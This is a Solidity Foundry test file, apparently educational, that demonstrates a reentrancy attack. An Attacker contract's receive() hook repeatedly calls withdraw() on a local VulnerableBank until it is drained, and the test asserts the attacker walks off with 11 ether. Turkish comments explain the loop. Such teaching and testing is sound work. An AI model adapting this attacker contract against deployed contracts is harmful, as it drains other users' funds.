pragma solidity ^0.8.20;
import {VulnerableBank} from "../../src/reentrancy/VulnerableBank.sol";
import {Test, console} from "forge-std/Test.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    address attackerWallet;
    constructor(VulnerableBank _bank, address _attackerWallet) {
        vulnerableBank = _bank;
        attackerWallet = _attackerWallet;
    }

    function attack() public payable {
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw();
        withdrawMoney(payable(attackerWallet));
    }
    function withdrawMoney(address payable _address) public payable {
        uint256 moneyInside = address(this).balance;
        (bool success, ) = _address.call{value: moneyInside}("");
        require(success, "not send");
    }

    receive() external payable {
        // "Bankanın kendi adresinin kasasında 1 Ether'den fazla para var mı?"
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(); // Varsa çekmeye devam et!
        }
    }
}

contract TestAttacker is Test {
    address public ATTACKER = makeAddr("attacker");
    address public USER = makeAddr("user");
    address public USER2 = makeAddr("user2");
    VulnerableBank public vulnerableBank;
    Attacker public attackerContract;

    function setUp() public {
        vulnerableBank = new VulnerableBank();
        attackerContract = new Attacker(vulnerableBank, ATTACKER);
        vm.deal(USER, 5 ether);
        vm.deal(USER2, 5 ether);
        vm.deal(ATTACKER, 1 ether);

        vm.prank(USER);
        vulnerableBank.deposit{value: 5 ether}();

        vm.prank(USER2);
        vulnerableBank.deposit{value: 5 ether}();
    }

    function test_Attacker() public {
        console.log(address(vulnerableBank).balance);
        vm.prank(ATTACKER);
        attackerContract.attack{value: 1 ether}();
        console.log(address(vulnerableBank).balance);
        console.log(address(ATTACKER).balance);
        assertEq(0, address(vulnerableBank).balance);
        assertEq(11* 10**18, address(ATTACKER).balance);
    }
}
